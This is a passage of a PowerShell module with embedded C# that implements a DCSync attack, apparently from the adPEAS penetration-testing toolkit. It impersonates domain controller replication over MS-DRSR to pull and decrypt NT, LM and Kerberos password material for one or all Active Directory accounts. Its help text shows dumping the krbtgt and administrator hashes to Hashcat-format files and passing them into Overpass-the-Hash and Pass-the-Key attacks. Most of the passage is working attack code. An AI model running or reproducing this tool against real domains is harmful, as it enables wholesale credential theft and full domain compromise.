                    if (ext_out.cb > Marshal.OffsetOf(typeof(DRS_EXTENSIONS_INT), "dwReplEpoch").ToInt32())
                        extensions_out.dwReplEpoch = ext_out.dwReplEpoch;
                    if (ext_out.cb > Marshal.OffsetOf(typeof(DRS_EXTENSIONS_INT), "dwFlagsExt").ToInt32())
                        extensions_out.dwFlagsExt = ext_out.dwFlagsExt & 4;
                    if (ext_out.cb > Marshal.OffsetOf(typeof(DRS_EXTENSIONS_INT), "ConfigObjGUID").ToInt32())
                        extensions_out.ConfigObjGUID = ext_out.ConfigObjGUID;
                }
                return (int)result.ToInt64();
            }
            catch (System.Runtime.InteropServices.SEHException)
            {
                extensions_out = new DRS_EXTENSIONS_INT();
                return Marshal.GetExceptionCode();
            }
        }

        static int DrsDomainControllerInfo(IntPtr hDrs, string domain, string serverName, out Guid NtdsDsaObjectGuid)
        {
            NtdsDsaObjectGuid = Guid.Empty;
            DRS_MSG_DCINFOREQ_V1 dcInfoReq = new DRS_MSG_DCINFOREQ_V1
            {
                InfoLevel = 2,
                Domain = Marshal.StringToHGlobalUni(domain)
            };
            uint dcOutVersion = 0;
            DRS_MSG_DCINFOREPLY_V2 dcInfoRep = new DRS_MSG_DCINFOREPLY_V2();

            try
            {
                IntPtr result = NdrClientCall2_DCInfo(GetStubPtr(4, 0), GetProcStringPtr(716), hDrs, 1, dcInfoReq, ref dcOutVersion, ref dcInfoRep);

                int size = Marshal.SizeOf(typeof(DS_DOMAIN_CONTROLLER_INFO_2W));
                for (uint i = 0; i < dcInfoRep.cItems; i++)
                {
                    DS_DOMAIN_CONTROLLER_INFO_2W info = (DS_DOMAIN_CONTROLLER_INFO_2W)Marshal.PtrToStructure(IntPtr.Add(dcInfoRep.rItems, (int)(i * size)), typeof(DS_DOMAIN_CONTROLLER_INFO_2W));
                    string infoDns = info.DnsHostName != IntPtr.Zero ? Marshal.PtrToStringUni(info.DnsHostName) : "";
                    string infoNetbios = info.NetbiosName != IntPtr.Zero ? Marshal.PtrToStringUni(info.NetbiosName) : "";
                    if (serverName.StartsWith(infoDns, StringComparison.InvariantCultureIgnoreCase) || serverName.StartsWith(infoNetbios, StringComparison.InvariantCultureIgnoreCase))
                        NtdsDsaObjectGuid = info.NtdsDsaObjectGuid;
                }
                return (int)result.ToInt64();
            }
            catch (System.Runtime.InteropServices.SEHException)
            {
                return Marshal.GetExceptionCode();
            }
            finally
            {
                Marshal.FreeHGlobal(dcInfoReq.Domain);
            }
        }

        static uint DrsrCrackName(IntPtr hDrs, string Name, out Guid userGuid, uint formatOffered = 0)
        {
            userGuid = Guid.Empty;
            DRS_MSG_CRACKREQ_V1 dcInfoReq = new DRS_MSG_CRACKREQ_V1();

            if (formatOffered == 0)
            {
                if (Name.Contains("\\")) dcInfoReq.formatOffered = 2;       // DS_NT4_ACCOUNT_NAME
                else if (Name.Contains("=")) dcInfoReq.formatOffered = 1;   // DS_FQDN_1779_NAME
                else if (Name.Contains("@")) dcInfoReq.formatOffered = 8;   // DS_USER_PRINCIPAL_NAME
                else dcInfoReq.formatOffered = 0xfffffff9;                  // DS_NT4_ACCOUNT_NAME_SANS_DOMAIN
            }
            else
                dcInfoReq.formatOffered = formatOffered;

            dcInfoReq.formatDesired = 6; // DS_UNIQUE_ID_NAME
            dcInfoReq.cNames = 1;
            IntPtr NameIntPtr = Marshal.StringToHGlobalUni(Name);
            GCHandle handle = GCHandle.Alloc(NameIntPtr, GCHandleType.Pinned);
            dcInfoReq.rpNames = handle.AddrOfPinnedObject();

            IntPtr dcInfoRep = IntPtr.Zero;
            uint dcOutVersion = 0;

            try
            {
                IntPtr result = NdrClientCall2_CrackName(GetStubPtr(4, 0), GetProcStringPtr(558), hDrs, 1, dcInfoReq, ref dcOutVersion, ref dcInfoRep);

                if (result == IntPtr.Zero)
                {
                    if (dcInfoRep != IntPtr.Zero)
                    {
                        DS_NAME_RESULTW dsNameResult = (DS_NAME_RESULTW)Marshal.PtrToStructure(dcInfoRep, typeof(DS_NAME_RESULTW));
                        if (dsNameResult.cItems >= 1)
                        {
                            DS_NAME_RESULT_ITEMW item = (DS_NAME_RESULT_ITEMW)Marshal.PtrToStructure(dsNameResult.rItems, typeof(DS_NAME_RESULT_ITEMW));
                            if (item.status == 0)
                            {
                                string guidString = Marshal.PtrToStringUni(item.pName);
                                userGuid = new Guid(guidString);
                                return 0;
                            }
                            return item.status; // Return actual DS_NAME_ERROR status
                        }
                    }
                    return 0xFFFF; // RPC succeeded but no result data
                }
                return (uint)result.ToInt64();
            }
            catch (System.Runtime.InteropServices.SEHException)
            {
                return (uint)Marshal.GetExceptionCode();
            }
            finally
            {
                handle.Free();
                Marshal.FreeHGlobal(NameIntPtr);
            }
        }
        #endregion

        #region Decryption
        static byte[] DecryptReplicationData(byte[] data)
        {
            if (data == null || data.Length < 16) return null;

            byte[] key;
            using (MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider())
            {
                md5.TransformBlock(SessionKey, 0, SessionKey.Length, SessionKey, 0);
                md5.TransformFinalBlock(data, 0, 16);
                key = md5.Hash;
            }

            byte[] todecrypt = new byte[data.Length - 16];
            Array.Copy(data, 16, todecrypt, 0, data.Length - 16);
            CRYPTO_BUFFER todecryptBuffer = GetCryptoBuffer(todecrypt);
            CRYPTO_BUFFER keyBuffer = GetCryptoBuffer(key);
            RtlEncryptDecryptRC4(ref todecryptBuffer, ref keyBuffer);
            byte[] decrypted = new byte[todecryptBuffer.Length];
            Marshal.Copy(todecryptBuffer.Buffer, decrypted, 0, decrypted.Length);
            Marshal.FreeHGlobal(todecryptBuffer.Buffer);
            Marshal.FreeHGlobal(keyBuffer.Buffer);

            byte[] output = new byte[decrypted.Length - 4];
            Array.Copy(decrypted, 4, output, 0, decrypted.Length - 4);
            uint crc = CalcCrc32(output);
            uint expectedCrc = BitConverter.ToUInt32(decrypted, 0);
            if (crc != expectedCrc) return null;
            return output;
        }

        public static byte[] DecryptHashWithRID(byte[] hashEncryptedWithRID, byte[] sidByteForm)
        {
            if (hashEncryptedWithRID == null || sidByteForm == null || hashEncryptedWithRID.Length < 16)
                return null;

            GCHandle handle = GCHandle.Alloc(sidByteForm, GCHandleType.Pinned);
            IntPtr sidIntPtr = handle.AddrOfPinnedObject();
            IntPtr SubAuthorityCountIntPtr = GetSidSubAuthorityCount(sidIntPtr);
            byte SubAuthorityCount = Marshal.ReadByte(SubAuthorityCountIntPtr);
            IntPtr SubAuthorityIntPtr = GetSidSubAuthority(sidIntPtr, (uint)SubAuthorityCount - 1);
            uint rid = (uint)Marshal.ReadInt32(SubAuthorityIntPtr);
            handle.Free();

            byte[] output = new byte[16];
            IntPtr outputPtr = Marshal.AllocHGlobal(16);
            RtlDecryptDES2blocks1DWORD(hashEncryptedWithRID, ref rid, outputPtr);
            Marshal.Copy(outputPtr, output, 0, 16);
            Marshal.FreeHGlobal(outputPtr);
            return output;
        }
        #endregion

        #region Marshal Replication Data
        static List<Dictionary<int, object>> MarshalReplicationData(DRS_MSG_GETCHGREPLY_V6 pmsgOut)
        {
            List<Dictionary<int, object>> allData = new List<Dictionary<int, object>>();
            IntPtr pObjects = pmsgOut.pObjects;
            uint numObjects = pmsgOut.cNumObjects;

            if (pObjects == IntPtr.Zero || numObjects == 0) return allData;

            REPLENTINFLIST list = (REPLENTINFLIST)Marshal.PtrToStructure(pObjects, typeof(REPLENTINFLIST));

            while (numObjects > 0)
            {
                Dictionary<int, object> replicationData = new Dictionary<int, object>();
                int size = Marshal.SizeOf(typeof(ATTR));

                for (uint i = 0; i < list.Entinf.AttrBlock.attrCount; i++)
                {
                    ATTR attr = (ATTR)Marshal.PtrToStructure(IntPtr.Add(list.Entinf.AttrBlock.pAttr, (int)(i * size)), typeof(ATTR));
                    int sizeval = Marshal.SizeOf(typeof(ATTRVAL));
                    List<byte[]> values = new List<byte[]>();

                    for (uint j = 0; j < attr.AttrVal.valCount; j++)
                    {
                        ATTRVAL attrval = (ATTRVAL)Marshal.PtrToStructure(IntPtr.Add(attr.AttrVal.pAVal, (int)(j * sizeval)), typeof(ATTRVAL));
                        byte[] data = new byte[attrval.valLen];
                        Marshal.Copy(attrval.pVal, data, 0, (int)attrval.valLen);

                        switch ((ATT)attr.attrTyp)
                        {
                            case ATT.ATT_UNICODE_PWD:
                            case ATT.ATT_NT_PWD_HISTORY:
                            case ATT.ATT_DBCS_PWD:
                            case ATT.ATT_LM_PWD_HISTORY:
                            case ATT.ATT_SUPPLEMENTAL_CREDENTIALS:
                                data = DecryptReplicationData(data);
                                break;
                        }
                        values.Add(data);
                    }

                    if (values.Count == 1)
                        replicationData[(int)attr.attrTyp] = values[0];
                    else if (values.Count > 1)
                        replicationData[(int)attr.attrTyp] = values;
                }

                allData.Add(replicationData);

                if (list.pNextEntInf != IntPtr.Zero)
                    list = (REPLENTINFLIST)Marshal.PtrToStructure(list.pNextEntInf, typeof(REPLENTINFLIST));
                numObjects--;
            }
            return allData;
        }
        #endregion

        #region Public API
        [System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptions]
        public static DCSyncResult GetReplicationData(string dc, string domain, string user, string guid, string authuser, string authdomain, string authpassword, bool forcentlm, bool allUsers, string altservice)
        {
            DCSyncResult result = new DCSyncResult();
            List<DCSyncUserData> userDataList = new List<DCSyncUserData>();

            SessionKey = null;

            IntPtr hBinding = IntPtr.Zero;  // Declare outside try so it's available in finally

            try
            {
                if (!Asn1_init())
                {
                    result.Error = "Failed to initialize ASN1 module";
                    return result;
                }

                int rpcAuth = forcentlm ? RPC_C_AUTHN_WINNT : RPC_C_AUTHN_GSS_NEGOTIATE;
                if (string.IsNullOrEmpty(altservice)) altservice = "ldap";

                hBinding = CreateBinding(dc, altservice, rpcAuth, authuser, authdomain, authpassword, forcentlm);
                if (hBinding == IntPtr.Zero)
                {
                    result.Error = "Failed to create RPC binding to " + dc;
                    Asn1_term();
                    return result;
                }

                DRS_EXTENSIONS_INT DrsExtensionsInt = new DRS_EXTENSIONS_INT();
                DrsExtensionsInt.cb = (uint)(Marshal.SizeOf(typeof(DRS_EXTENSIONS_INT)) - Marshal.SizeOf(typeof(uint)));
                DrsExtensionsInt.dwFlags = ALL_EXT;
                DrsExtensionsInt.dwFlagsExt = DRS_EXT_LH_BETA2 | DRS_EXT_RECYCLE_BIN | DRS_EXT_PAM;
                DrsExtensionsInt.dwExtCaps = DRS_EXT_LH_BETA2 | DRS_EXT_RECYCLE_BIN | DRS_EXT_PAM;

                DRS_EXTENSIONS_INT extensions;
                IntPtr hDrs;
                Guid DomainGUID;
                Guid UserGuid;

                // Initial DRS bind with well-known GUID
                int bindResult = DrsrGetDCBind(hBinding, new Guid("e24d201a-4fd6-11d1-a3da-0000f875ae0d"), DrsExtensionsInt, out extensions, out hDrs);
                if (bindResult != 0)
                {
                    result.Error = "DRSBind failed (initial): error " + bindResult;
                    RpcBindingFree(ref hBinding);
                    Asn1_term();
                    return result;
                }

                // Get DC info
                int dcInfoResult = DrsDomainControllerInfo(hDrs, domain, dc, out DomainGUID);
                if (dcInfoResult != 0)
                {
                    result.Error = "DrsDomainControllerInfo failed: error " + dcInfoResult;
                    RpcBindingFree(ref hBinding);
                    Asn1_term();
                    return result;
                }

                // Resolve user to GUID
                if (!string.IsNullOrEmpty(guid))
                {
                    UserGuid = new Guid(guid);
                }
                else if (!string.IsNullOrEmpty(user))
                {
                    uint crackResult = DrsrCrackName(hDrs, user, out UserGuid);
                    if (crackResult != 0)
                    {
                        // Fallback: try DOMAIN\user format (DS_NT4_ACCOUNT_NAME = 2)
                        string domainNetbios = domain.Split('.')[0].ToUpper();
                        string nt4Name = domainNetbios + "\\" + user;
                        crackResult = DrsrCrackName(hDrs, nt4Name, out UserGuid, 2);
                    }
                    if (crackResult != 0)
                    {
                        // Fallback: try user@domain format (DS_USER_PRINCIPAL_NAME = 8)
                        string upnName = user + "@" + domain;
                        crackResult = DrsrCrackName(hDrs, upnName, out UserGuid, 8);
                    }
                    if (crackResult != 0)
                    {
                        string errorMsg;
                        if (crackResult == 1)
                            errorMsg = "User '" + user + "' could not be resolved (DS_NAME_ERROR_RESOLVING). The name is being processed but not yet available.";
                        else if (crackResult == 2)
                            errorMsg = "User '" + user + "' not found in domain '" + domain + "' (DS_NAME_ERROR_NOT_FOUND). Check sAMAccountName spelling.";
                        else if (crackResult == 3)
                            errorMsg = "User '" + user + "' is ambiguous (DS_NAME_ERROR_NOT_UNIQUE). Multiple objects match this name.";
                        else if (crackResult == 4)
                            errorMsg = "User '" + user + "' cannot be mapped (DS_NAME_ERROR_NO_MAPPING). The name format is not recognized.";
                        else if (crackResult == 5)
                            errorMsg = "User '" + user + "' exists in domain only (DS_NAME_ERROR_DOMAIN_ONLY). Cannot resolve to a specific object.";
                        else
                            errorMsg = "DRSCrackNames failed for '" + user + "': unknown status " + crackResult;

                        result.Error = errorMsg;
                        RpcBindingFree(ref hBinding);
                        Asn1_term();
                        return result;
                    }
                }
                else
                {
                    result.Error = "No user or GUID specified";
                    RpcBindingFree(ref hBinding);
                    Asn1_term();
                    return result;
                }

                // Re-bind with actual DC GUID
                bindResult = DrsrGetDCBind(hBinding, DomainGUID, DrsExtensionsInt, out extensions, out hDrs);
                if (bindResult != 0)
                {
                    result.Error = "DRSBind failed (DC GUID): error " + bindResult;
                    RpcBindingFree(ref hBinding);
                    Asn1_term();
                    return result;
                }

                // Build request
                DRS_MSG_GETCHGREQ_V8 mSG_GETCHGREQ = new DRS_MSG_GETCHGREQ_V8();
                mSG_GETCHGREQ.uuidDsaObjDest = DomainGUID;

                DSNAME dsname = new DSNAME();
                dsname.Guid = UserGuid;
                IntPtr pdsName = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(DSNAME)));
                Marshal.StructureToPtr(dsname, pdsName, true);
                mSG_GETCHGREQ.pNC = pdsName;
                mSG_GETCHGREQ.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
                mSG_GETCHGREQ.cMaxObjects = (uint)(allUsers ? 1000 : 1);
                mSG_GETCHGREQ.cMaxBytes = 0x00a00000;
                mSG_GETCHGREQ.ulExtendedOp = (uint)(allUsers ? 0 : 6);

                // Build partial attr set
                PARTIAL_ATTR_VECTOR_V1_EXT partAttSet = new PARTIAL_ATTR_VECTOR_V1_EXT();
                mSG_GETCHGREQ.PrefixTableDest = new SCHEMA_PREFIX_TABLE();
                partAttSet.dwVersion = 1;
                partAttSet.dwReserved1 = 0;
                partAttSet.cAttrs = (uint)oids.Length;
                partAttSet.rgPartialAttr = new uint[oids.Length];

                for (int i = 0; i < oids.Length; i++)
                    DrsrMakeAttid(ref mSG_GETCHGREQ.PrefixTableDest, oids[i], ref partAttSet.rgPartialAttr[i]);

                mSG_GETCHGREQ.pPartialAttrSet = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PARTIAL_ATTR_VECTOR_V1_EXT)));
                Marshal.StructureToPtr(partAttSet, mSG_GETCHGREQ.pPartialAttrSet, false);

                // Execute replication
                // Safety limit to prevent infinite loops
                const int MAX_REPLICATION_ITERATIONS = 10000;
                int iterationCount = 0;

                do
                {
                    iterationCount++;

                    // Timeout protection
                    if (iterationCount > MAX_REPLICATION_ITERATIONS)
                    {
                        result.Error = "DCSync exceeded maximum iterations (" + MAX_REPLICATION_ITERATIONS + "). Possible infinite loop or DC issue.";
                        break;
                    }

                    DRS_MSG_GETCHGREPLY_V6 mSG_GETCHGREPLY = new DRS_MSG_GETCHGREPLY_V6();
                    uint dwOutVersion = 0;
                    IntPtr rpcResult = NdrClientCall2_GetNCChanges(GetStubPtr(4, 0), GetProcStringPtr(134), hDrs, 8, mSG_GETCHGREQ, ref dwOutVersion, ref mSG_GETCHGREPLY);

                    if ((int)rpcResult.ToInt64() != 0)
                    {
                        result.Error = "GetNCChanges RPC call failed: error " + (int)rpcResult.ToInt64();
                        break;
                    }

                    // Check DRSUAPI-specific error code
                    if (mSG_GETCHGREPLY.dwDRSError != 0)
                    {
                        string drsuapiError;
                        if (mSG_GETCHGREPLY.dwDRSError == 8439)
                            drsuapiError = "ERROR_DS_DRA_ACCESS_DENIED - Insufficient replication privileges";
                        else if (mSG_GETCHGREPLY.dwDRSError == 8593)
                            drsuapiError = "ERROR_DS_DRA_BAD_NC - Invalid naming context";
                        else if (mSG_GETCHGREPLY.dwDRSError == 8440)
                            drsuapiError = "ERROR_DS_DRA_BAD_DN - Invalid distinguished name";
                        else if (mSG_GETCHGREPLY.dwDRSError == 8477)
                            drsuapiError = "ERROR_DS_DRA_SHUTDOWN - DC is shutting down";
                        else
                            drsuapiError = "DRSUAPI error code: " + mSG_GETCHGREPLY.dwDRSError;

                        result.Error = drsuapiError;
                        break;
                    }

                    // Validate response has data
                    if (mSG_GETCHGREPLY.pObjects == IntPtr.Zero && mSG_GETCHGREPLY.cNumObjects == 0)
                    {
                        // No objects returned - could be end of replication or error
                        if (!allUsers)
                        {
                            result.Error = "No replication data returned for target object";
                            break;
                        }
                        // For allUsers, empty response just means we're done
                        break;
                    }

                    List<Dictionary<int, object>> replData = MarshalReplicationData(mSG_GETCHGREPLY);

                    foreach (var replicationData in replData)
                    {
                        DCSyncUserData userData = new DCSyncUserData();

                        if (replicationData.ContainsKey((int)ATT.ATT_SAM_ACCOUNT_NAME))
                            userData.SAMAccountName = Encoding.Unicode.GetString((byte[])replicationData[(int)ATT.ATT_SAM_ACCOUNT_NAME]);
                        if (replicationData.ContainsKey((int)ATT.ATT_USER_PRINCIPAL_NAME))
                            userData.UserPrincipalName = Encoding.Unicode.GetString((byte[])replicationData[(int)ATT.ATT_USER_PRINCIPAL_NAME]);
                        if (replicationData.ContainsKey((int)ATT.ATT_RDN))
                            userData.DisplayName = Encoding.Unicode.GetString((byte[])replicationData[(int)ATT.ATT_RDN]);
                        if (replicationData.ContainsKey((int)ATT.ATT_OBJECT_SID))
                            userData.ObjectSID = (byte[])replicationData[(int)ATT.ATT_OBJECT_SID];
                        if (replicationData.ContainsKey((int)ATT.ATT_USER_ACCOUNT_CONTROL))
                            userData.UserAccountControl = BitConverter.ToInt32((byte[])replicationData[(int)ATT.ATT_USER_ACCOUNT_CONTROL], 0);
                        if (replicationData.ContainsKey((int)ATT.ATT_SAM_ACCOUNT_TYPE))
                            userData.SAMAccountType = BitConverter.ToInt32((byte[])replicationData[(int)ATT.ATT_SAM_ACCOUNT_TYPE], 0);
                        if (replicationData.ContainsKey((int)ATT.ATT_PWD_LAST_SET))
                            userData.PwdLastSet = BitConverter.ToInt64((byte[])replicationData[(int)ATT.ATT_PWD_LAST_SET], 0);
                        if (replicationData.ContainsKey((int)ATT.ATT_ACCOUNT_EXPIRES))
                            userData.AccountExpires = BitConverter.ToInt64((byte[])replicationData[(int)ATT.ATT_ACCOUNT_EXPIRES], 0);
                        if (replicationData.ContainsKey((int)ATT.ATT_UNICODE_PWD))
                            userData.UnicodePassword = (byte[])replicationData[(int)ATT.ATT_UNICODE_PWD];
                        if (replicationData.ContainsKey((int)ATT.ATT_NT_PWD_HISTORY))
                            userData.NTPasswordHistory = (byte[])replicationData[(int)ATT.ATT_NT_PWD_HISTORY];
                        if (replicationData.ContainsKey((int)ATT.ATT_DBCS_PWD))
                            userData.LMPassword = (byte[])replicationData[(int)ATT.ATT_DBCS_PWD];
                        if (replicationData.ContainsKey((int)ATT.ATT_LM_PWD_HISTORY))
                            userData.LMPasswordHistory = (byte[])replicationData[(int)ATT.ATT_LM_PWD_HISTORY];
                        if (replicationData.ContainsKey((int)ATT.ATT_SUPPLEMENTAL_CREDENTIALS))
                            userData.SupplementalCredentials = (byte[])replicationData[(int)ATT.ATT_SUPPLEMENTAL_CREDENTIALS];
                        if (replicationData.ContainsKey((int)ATT.ATT_SID_HISTORY))
                            userData.SIDHistory = (byte[])replicationData[(int)ATT.ATT_SID_HISTORY];

                        userDataList.Add(userData);
                    }

                    if (allUsers && Convert.ToBoolean(mSG_GETCHGREPLY.fMoreData))
                    {
                        mSG_GETCHGREQ.uuidInvocIdSrc = mSG_GETCHGREPLY.uuidInvocIdSrc;
                        mSG_GETCHGREQ.usnvecFrom = mSG_GETCHGREPLY.usnvecTo;
                    }
                    else
                    {
                        break;
                    }
                } while (true);

                RpcBindingFree(ref hBinding);
                Asn1_term();

                result.Success = userDataList.Count > 0;
                result.Users = userDataList.ToArray();
                if (!result.Success && string.IsNullOrEmpty(result.Error))
                    result.Error = "No replication data returned";
            }
            catch (Exception ex)
            {
                result.Error = ex.GetType().Name + ": " + ex.Message;
            }
            finally
            {
                // Always cleanup resources, even on exception
                if (hBinding != IntPtr.Zero)
                {
                    try { RpcBindingFree(ref hBinding); } catch { }
                }
                Asn1_term();
            }

            return result;
        }
        #endregion
    }
}
'@

# ============================================================================
# PowerShell Wrapper Function
# ============================================================================

function Invoke-DCSync {
<#
.SYNOPSIS
    Replicates Active Directory objects using the DRSUAPI protocol to extract credential material.

.DESCRIPTION
    Invoke-DCSync uses the MS-DRSR (Directory Replication Service Remote) RPC protocol to replicate Active Directory objects,
    extracting NT hashes, Kerberos keys (AES256, AES128, DES), cleartext passwords (if reversible encryption is enabled), and WDigest hashes.

    This is the same replication mechanism that Domain Controllers use for normal AD replication.
    Requires the following extended rights on the target domain:
    - DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
    - DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)

.PARAMETER Identity
    Target user to replicate. Can be:
    - sAMAccountName (e.g., "administrator", "krbtgt")
    - Distinguished Name (e.g., "CN=krbtgt,CN=Users,DC=contoso,DC=com")
    - SID (e.g., "S-1-5-21-...")
    - objectGUID (e.g., "a4b2c1d3-...")

    Default: "krbtgt" (the domain's Kerberos service account)

.PARAMETER Domain
    Target domain FQDN (e.g., "contoso.com").
    If not specified, auto-detected from the current adPEAS session (see Connect-adPEAS).

.PARAMETER Server
    Specific Domain Controller to query (hostname or IP).
    If not specified, uses the following priority:
    1. Current adPEAS session DC (if Connect-adPEAS was used)
    2. Auto-discovery via Resolve-adPEASName (SRV records + reachability test)

.PARAMETER Credential
    PSCredential object for authentication.
    If not specified, uses the current Windows session credentials (SSPI/Negotiate).
    For session-based authentication, use Connect-adPEAS first.

.PARAMETER JustNTHash
    Only output NT hash (returns object with SAMAccountName and NTHash).
    Mutually exclusive with -JustAES, -JustLM, and -JustCleartext.

.PARAMETER JustAES
    Only output AES256 and AES128 keys (returns object with SAMAccountName, AES256Key, AES128Key).
    Mutually exclusive with -JustNTHash, -JustLM, and -JustCleartext.

.PARAMETER JustLM
    Only output LM hash (returns object with SAMAccountName, LMHash).
    Note: LM hashes are rarely used in modern environments.
    Mutually exclusive with -JustNTHash, -JustAES, and -JustCleartext.

.PARAMETER JustCleartext
    Only output cleartext password if available (returns object with SAMAccountName, CleartextPassword).
    Note: Only works if reversible encryption is enabled for the account.
    Mutually exclusive with -JustNTHash, -JustAES, and -JustLM.

.PARAMETER IncludeHistory
    Include password history hashes in the output.
    With -JustNTHash: Adds NTHashHistory property (if present).
    With -JustLM: Adds LMHashHistory property (if present).
    Without output filters: Adds both NTHashHistory and LMHashHistory properties (if present).
    By default, history hashes are excluded to reduce output size.

.PARAMETER AllAccounts
    Replicate all accounts in the domain (both users and computers).
    Mutually exclusive with -UsersOnly and -ComputersOnly.
    Can be combined with -EnabledOnly to filter for enabled accounts only.

.PARAMETER UsersOnly
    Only replicate user accounts (excludes computer accounts).
    Mutually exclusive with -AllAccounts and -ComputersOnly.
    Can be combined with -EnabledOnly to filter for enabled users only.

.PARAMETER ComputersOnly
    Only replicate computer accounts (excludes user accounts).
    Mutually exclusive with -AllAccounts and -UsersOnly.
    Can be combined with -EnabledOnly to filter for enabled computers only.

.PARAMETER EnabledOnly
    Only replicate enabled accounts (excludes disabled accounts).
    Can be combined with -AllAccounts, -UsersOnly, or -ComputersOnly.

.PARAMETER OutputFile
    Export credential material in username:hash format to the specified file.
    Exports whatever is currently being queried:
    - Normal mode or -JustNTHash: username:nthash (Hashcat mode 1000)
    - -JustAES: username:aes256key and username:aes128key (Hashcat mode 18200 for Kerberos 5 TGS-REP AES256)
    - -JustLM: username:lmhash (Hashcat mode 3000)
    - -JustCleartext: username:cleartext

    If combined with -IncludeHistory, also exports history as username_history1:hash, username_history2:hash, etc.
    File is overwritten if it exists.

.EXAMPLE
    Invoke-DCSync -Identity "krbtgt" -Domain "contoso.com" -Server "dc01.contoso.com"

    Replicates the krbtgt account from dc01.contoso.com and extracts all credential material.

.EXAMPLE
    Invoke-DCSync -Identity "administrator" -Domain "contoso.com" -Server "dc01.contoso.com" -Credential (Get-Credential)

    Replicates the administrator account using explicit credentials.

.EXAMPLE
    Invoke-DCSync -Identity "krbtgt" -Domain "contoso.com" -Server "dc01.contoso.com" -JustNTHash

    Outputs only the NT hash object:
    SAMAccountName : krbtgt
    NTHash         : 1981d81c419652727d3d0c060ab0e76c

.EXAMPLE
    Invoke-DCSync -Identity "S-1-5-21-2825286099-527498140-4021532933-502" -Domain "contoso.com" -Server "dc01.contoso.com"

    Replicates a user by SID (useful when sAMAccountName is unknown).

.EXAMPLE
    $result = Invoke-DCSync -Identity "krbtgt" -Domain "contoso.com" -Server "dc01.contoso.com" -JustNTHash
    Invoke-KerberosAuth -UserName "krbtgt" -Domain "contoso.com" -NTHash $result.NTHash

    Extract krbtgt NT hash and use it for Overpass-the-Hash attack.

.EXAMPLE
    Invoke-DCSync -Identity "administrator" -JustAES

    Outputs only AES keys for the administrator account (useful for Pass-the-Key attacks).

.EXAMPLE
    Invoke-DCSync -Identity "user01" -IncludeHistory

    Extracts current and historical password hashes (useful for password reuse analysis).

.EXAMPLE
    Invoke-DCSync -Identity "svc_backup" -JustCleartext

    Outputs only cleartext password if reversible encryption is enabled for the account.

.EXAMPLE
    Invoke-DCSync -AllAccounts -UsersOnly -JustLM | Where-Object { $_.LMHash }

    Finds all users with LM hashes (insecure legacy hashes).

.EXAMPLE
    Invoke-DCSync -AllAccounts -UsersOnly -EnabledOnly -Domain "contoso.com"

    Replicates all enabled user accounts (excludes computers and disabled accounts).

.EXAMPLE
    Invoke-DCSync -AllAccounts -ComputersOnly -Domain "contoso.com" | Where-Object { $_.SAMAccountName -like "DC*" }

    Replicates all computer accounts and filters for Domain Controllers.

.EXAMPLE
    Invoke-DCSync -AllAccounts -UsersOnly -EnabledOnly -Domain "contoso.com" -OutputFile "hashes.txt"

    Replicates all enabled users and exports NT hashes in Hashcat format (username:hash) to hashes.txt.
    File contents example:
    Administrator:9ec9d30b8b69ecbbada1d3110f354f8d
    krbtgt:1981d81c419652727d3d0c060ab0e76c
    user01:32ed87bdb5fdc5e9cba88547376818d4

.EXAMPLE
    Invoke-DCSync -AllAccounts -UsersOnly -IncludeHistory -OutputFile "hashes_with_history.txt"

    Exports current NT hashes plus history hashes:
    Administrator:9ec9d30b8b69ecbbada1d3110f354f8d
    Administrator_history1:a1b2c3d4e5f6...
    Administrator_history2:f6e5d4c3b2a1...
    krbtgt:1981d81c419652727d3d0c060ab0e76c

.OUTPUTS
    PSCustomObject with the following properties (depending on output mode):

    Normal mode (no -Just* parameter):
    - PSTypeName: 'adPEAS.DCSync.Result'
    - Success: Boolean indicating if replication succeeded
    - Domain: Target domain FQDN
    - DomainController: Target DC hostname
    - SAMAccountName: User's sAMAccountName
    - UserPrincipalName: User's UPN
    - DisplayName: User's display name
    - ObjectSID: User's SID string
    - RID: User's Relative Identifier (last part of SID)
    - UserAccountControl: UAC flags
    - SAMAccountType: Account type
    - PwdLastSet: DateTime when password was last changed
    - AccountExpires: DateTime when account expires (null if never)
    - NTHash: NT hash (32 hex chars)
    - LMHash: LM hash (32 hex chars, null if not present)
    - NTHashHistory: Array of previous NT hashes (only with -IncludeHistory, only if present)
    - LMHashHistory: Array of previous LM hashes (only with -IncludeHistory, only if present)
    - AES256Key: AES256-CTS-HMAC-SHA1-96 key (64 hex chars)
    - AES128Key: AES128-CTS-HMAC-SHA1-96 key (32 hex chars)
    - DESKey: DES-CBC-MD5 key (16 hex chars)
    - KerberosSalt: Kerberos salt string
    - CleartextPassword: Cleartext password (null if not available)
    - WDigestHashes: Array of 29 WDigest hashes
    - SupplementalCredentials: Raw supplementalCredentials bytes
    - Message: Success/error message
    - Error: Error details (null on success)

    -JustNTHash mode:
    - SAMAccountName: User's sAMAccountName
    - NTHash: NT hash (32 hex chars)
    - NTHashHistory: Array of previous NT hashes (only with -IncludeHistory, only if present)

    -JustAES mode:
    - SAMAccountName: User's sAMAccountName
    - AES256Key: AES256-CTS-HMAC-SHA1-96 key (64 hex chars)
    - AES128Key: AES128-CTS-HMAC-SHA1-96 key (32 hex chars)

    -JustLM mode:
    - SAMAccountName: User's sAMAccountName
    - LMHash: LM hash (32 hex chars, null if not present)
    - LMHashHistory: Array of previous LM hashes (only with -IncludeHistory, only if present)

    -JustCleartext mode:
    - SAMAccountName: User's sAMAccountName
    - CleartextPassword: Cleartext password (null if not available)

.NOTES
    Author: Alexander Sturz (@_61106960_)
    Based on: SharpKatz (BSD 3-Clause, @b4rtik) and MakeMeEnterpriseAdmin (vincent.letoux@mysmartlogon.com)
#>
    [CmdletBinding()]
    param(
        [Parameter(Position=0, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
        [string]$Identity = "krbtgt",

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$false)]
        [switch]$JustNTHash,

        [Parameter(Mandatory=$false)]
        [switch]$JustAES,

